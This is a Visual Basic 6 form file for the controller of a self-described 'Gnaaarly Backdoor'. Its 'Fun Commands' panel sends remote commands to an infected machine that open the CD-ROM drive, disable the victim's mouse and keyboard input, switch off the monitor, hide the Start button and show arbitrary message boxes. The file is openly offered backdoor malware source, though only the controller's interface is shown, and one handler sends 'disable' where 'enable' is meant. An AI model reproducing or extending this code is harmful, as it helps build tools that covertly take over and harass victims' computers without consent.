VERSION 5.00
Begin VB.Form frmFun 
   BorderStyle     =   4  'Festes Werkzeugfenster
   Caption         =   "Gnaaarly Backdoor - Fun Commands"
   ClientHeight    =   5850
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   5535
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5850
   ScaleWidth      =   5535
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.Frame fraMonitor 
      Caption         =   "MONITOR ON/OFF"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Left            =   0
      TabIndex        =   22
      Top             =   4560
      Width           =   5535
      Begin VB.CommandButton cmdMonitorOn 
         Caption         =   "ON"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   3120
         TabIndex        =   25
         Top             =   360
         Width           =   2295
      End
      Begin VB.CommandButton cmdMonitorOff 
         Caption         =   "OFF"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   840
         TabIndex        =   24
         Top             =   360
         Width           =   2295
      End
      Begin VB.Label lblMonitor 
         Caption         =   "!monitor"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   23
         Top             =   360
         Width           =   735
      End
   End
   Begin VB.Frame fraStart 
      Caption         =   "WINDOWS START BUTTON"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Left            =   0
      TabIndex        =   18
      Top             =   3720
      Width           =   5535
      Begin VB.CommandButton cmdStartShow 
         Caption         =   "SHOW"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   3120
         TabIndex        =   21
         Top             =   360
         Width           =   2295
      End
      Begin VB.CommandButton cmdStartHide 
         Caption         =   "HIDE"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   840
         TabIndex        =   20
         Top             =   360
         Width           =   2295
      End
      Begin VB.Label lblStart 
         Caption         =   "!start"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   19
         Top             =   360
         Width           =   735
      End
   End
   Begin VB.Frame fraCdRom 
      Caption         =   "OPEN 'N CLOSE CD-ROM DRIVE"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Left            =   0
      TabIndex        =   14
      Top             =   2880
      Width           =   5535
      Begin VB.CommandButton cmdCdRomClose 
         Caption         =   "CLOSE"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   3120
         TabIndex        =   17
         Top             =   360
         Width           =   2295
      End
      Begin VB.CommandButton cmdCdRomOpen 
         Caption         =   "OPEN"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   840
         TabIndex        =   16
         Top             =   360
         Width           =   2295
      End
      Begin VB.Label lblCdRom 
         Caption         =   "!cdrom"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   360
         Width           =   615
      End
   End
   Begin VB.Frame fraInput 
      Caption         =   "DISABLE COMPLETE INPUT"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Left            =   0
      TabIndex        =   10
      Top             =   2040
      Width           =   5535
      Begin VB.CommandButton cmdInputEnable 
         Caption         =   "ENABLE"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   3120
         TabIndex        =   13
         Top             =   360
         Width           =   2295
      End
      Begin VB.CommandButton cmdInputDisable 
         Caption         =   "DISABLE"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   840
         TabIndex        =   12
         Top             =   360
         Width           =   2295
      End
      Begin VB.Label lblInput 
         Caption         =   "!input"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   360
         Width           =   855
      End
   End
   Begin VB.Frame fraMouse 
      Caption         =   "PLAY WITH THE MOUSE"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Left            =   0
      TabIndex        =   6
      Top             =   1200
      Width           =   5535
      Begin VB.CommandButton cmdMouseEnable 
         Caption         =   "ENABLE"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   3120
         TabIndex        =   9
         Top             =   360
         Width           =   2295
      End
      Begin VB.CommandButton cmdMouseDisable 
         Caption         =   "DISABLE"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   840
         TabIndex        =   8
         Top             =   360
         Width           =   2295
      End
      Begin VB.Label lblMouse 
         Caption         =   "!mouse"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   360
         Width           =   975
      End
   End
   Begin VB.CommandButton cmdBack 
      Caption         =   "BACK"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   5
      Top             =   5400
      Width           =   5295
   End
   Begin VB.Frame fraMsgBox 
      Caption         =   "SHOW A MESSAGEBOX"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1095
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   5535
      Begin VB.CommandButton cmdMsgBoxShow 
         Caption         =   "SHOW"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   720
         Width           =   5295
      End
      Begin VB.TextBox txtMsgBoxMessage 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   2520
         TabIndex        =   3
         Text            =   "Message here..."
         Top             =   360
         Width           =   2895
      End
      Begin VB.TextBox txtMsgBoxCaption 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   960
         TabIndex        =   2
         Text            =   "Caption"
         Top             =   360
         Width           =   1455
      End
      Begin VB.Label lblMsgBox 
         Caption         =   "!msgbox"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   360
         Width           =   975
      End
   End
End
Attribute VB_Name = "frmFun"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdBack_Click()
    frmFun.Hide
End Sub

Private Sub cmdCdRomClose_Click()
    frmMain.txtSend.Text = "!cdrom 'close'"
    SendCommand
    
    cmdCdRomOpen.Enabled = True
    cmdCdRomClose.Enabled = False
End Sub

Private Sub cmdCdRomOpen_Click()
    frmMain.txtSend.Text = "!cdrom 'open'"
    SendCommand
    
    cmdCdRomOpen.Enabled = False
    cmdCdRomClose.Enabled = True
End Sub

Private Sub cmdInputDisable_Click()
    frmMain.txtSend.Text = "!input 'disable'"
    SendCommand
    
    cmdInputEnable.Enabled = True
    cmdInputDisable.Enabled = False
End Sub

Private Sub cmdInputEnable_Click()
    frmMain.txtSend.Text = "!input 'disable'"
    SendCommand
    
    cmdInputEnable.Enabled = False
    cmdInputDisable.Enabled = True
End Sub

Private Sub cmdMonitorOff_Click()
    frmMain.txtSend.Text = "!monitor 'off'"
    SendCommand
    
    cmdMonitorOn.Enabled = True
    cmdMonitorOff.Enabled = False
End Sub

Private Sub cmdMonitorOn_Click()
    frmMain.txtSend.Text = "!monitor 'on'"
    SendCommand
    
    cmdMonitorOn.Enabled = False
    cmdMonitorOff.Enabled = True
End Sub

Private Sub cmdMouseDisable_Click()
    frmMain.txtSend.Text = "!mouse 'disable'"
    SendCommand
    
    cmdMouseEnable.Enabled = True
    cmdMouseDisable.Enabled = False
End Sub

Private Sub cmdMouseEnable_Click()
    frmMain.txtSend.Text = "!mouse 'enable'"
    SendCommand
    
    cmdMouseEnable.Enabled = False
    cmdMouseDisable.Enabled = True
End Sub

Private Sub cmdMsgBoxShow_Click()
    frmMain.txtSend.Text = "!msgbox '" & txtMsgBoxCaption.Text & _
                           "' '" & txtMsgBoxMessage.Text & "'"
    
    SendCommand
End Sub

Private Sub cmdStartHide_Click()
    frmMain.txtSend.Text = "!start 'hide'"
    SendCommand
    
    cmdStartShow.Enabled = True
    cmdStartHide.Enabled = False
End Sub

Private Sub cmdStartShow_Click()
    frmMain.txtSend.Text = "!start 'show'"
    SendCommand
    
    cmdStartShow.Enabled = False
    cmdStartHide.Enabled = True
End Sub
